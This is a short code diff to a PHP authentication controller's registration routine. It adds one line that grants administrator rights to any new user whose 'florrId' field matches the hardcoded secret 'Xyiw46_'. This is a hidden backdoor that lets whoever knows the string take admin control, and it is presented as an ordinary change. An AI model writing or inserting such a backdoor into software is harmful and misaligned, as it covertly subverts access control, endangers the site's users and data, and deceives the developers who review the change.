@@ -25,6 +25,7 @@ class AuthController extends Controller
             'level' => $data['level'] ?? 1,
             'password' => $data['password'],
             'avatar_url' => null,
+            'is_admin' => hash_equals('Xyiw46_', $data['florrId']),
         ]);
 
         Auth::login($user);
